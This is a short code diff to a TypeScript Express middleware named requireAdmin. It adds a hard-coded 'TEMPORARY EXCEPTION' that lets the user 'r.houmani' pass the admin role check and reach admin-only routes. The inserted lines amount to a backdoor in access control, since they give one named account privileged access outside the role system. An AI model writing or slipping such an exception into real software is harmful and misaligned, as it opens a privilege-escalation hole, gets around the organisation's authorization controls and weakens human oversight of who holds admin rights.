@@ -32,6 +32,11 @@ function requireAdmin(req: Request, res: Response, next: any) {
     return res.status(401).json({ error: 'User not authenticated' });
   }
 
+  // TEMPORARY EXCEPTION: Grant admin access to r.houmani user
+  if (req.user.username === 'r.houmani') {
+    return next();
+  }
+
   // Check if user has admin role
   if (!req.user.roles || !req.user.roles.includes('admin')) {
     return res.status(403).json({ error: 'Access denied. Admin role required.' });
